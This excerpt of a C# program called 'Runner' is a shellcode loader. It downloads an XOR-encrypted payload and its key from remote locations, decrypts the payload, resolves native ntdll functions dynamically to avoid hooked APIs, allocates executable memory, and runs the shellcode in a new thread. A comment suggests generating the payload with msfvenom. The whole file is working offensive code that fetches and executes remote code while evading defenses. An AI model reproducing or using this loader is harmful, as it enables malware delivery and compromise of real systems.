...
namespace Runner
{
    public class DELEGATES
    {
        ...
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate STRUCTS.NtStatus NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, ulong AllocationType, ulong Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate STRUCTS.NtStatus NtCreateThreadEx(out IntPtr threadHandle, UInt32 AccessMask, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate STRUCTS.NtStatus NtWaitForSingleObject(IntPtr threadHandle, bool alertTable, uint timeout);
    ...
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            /*
               Specify the shellcode and key locations. You can generate one with msvenom : 
            ...
            */
            ...
            byte[] waffle = client.DownloadData(sh);
            //Clean key from \n \r chars
            string key = client.DownloadString(dkey);
            string cleankey = key.Replace("\n", "").Replace("\r", "");

            //Shellcode decryption routine
            for (int i = 0; i < waffle.Length; i++)
            {
                waffle[i] = (byte)((uint)waffle[i] ^ cleankey[i % cleankey.Length]); 
            }


            //Let's allocate some memory for our shellcode
            //(IntPtr)(-1) is another way to specify the current process

            IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtAllocateVirtualMemory");
            DELEGATES.NtAllocateVirtualMemory ntva = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;
       
            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)waffle.Length;

            STRUCTS.NtStatus result = ntva((IntPtr)(-1), ref baseAddress, IntPtr.Zero, ref regionSize, 0x00001000 | 0x00002000, 0x40);        

            //Copy the shellcode in memory     
            Marshal.Copy(waffle, 0, (IntPtr)baseAddress, waffle.Length);


            //Create a thread
            pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtCreateThreadEx");
            DELEGATES.NtCreateThreadEx ntct = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

            IntPtr hThread = new IntPtr(0);
            result = ntct(out hThread, 0x02000000, IntPtr.Zero, (IntPtr)(-1), baseAddress, IntPtr.Zero, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);


            //Use the NT version of WaitForSingleObject      
            pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtWaitForSingleObject");
            DELEGATES.NtWaitForSingleObject ntws = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;
            
            result = ntws(hThread, false, 0);                        
